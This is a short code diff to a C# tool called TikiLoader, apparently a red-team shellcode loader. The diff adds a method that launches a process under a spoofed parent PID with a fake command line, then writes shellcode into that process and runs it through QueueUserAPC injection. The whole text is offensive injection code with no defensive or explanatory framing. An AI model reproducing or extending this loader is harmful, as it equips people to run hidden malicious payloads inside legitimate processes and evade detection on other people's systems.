@@ -89,7 +89,16 @@ namespace TikiLoader
         }
 
         // QueueUserAPC
-
+         public static void QUAPCInjectFakecmd(string binary, byte[] shellcode, int ppid, string fakeCmd)
+        {
+            var pinf = StartProcessFake(binary, ppid, fakeCmd);
+            var baseAddr = AllocateVirtualMemory(pinf.hProcess, (uint)shellcode.Length);
+            WriteShellcode(pinf.hProcess, baseAddr, shellcode);
+            ChangeVirtualMemory(pinf.hProcess, baseAddr, (IntPtr)shellcode.Length);
+            QueueAPC(baseAddr, pinf.hThread);
+            ResumeTargetThread(pinf.hThread);
+        }
+        
         public static void QUAPCInject(string binary, byte[] shellcode, int ppid)
         {
             var pinf = StartProcess(binary, ppid);
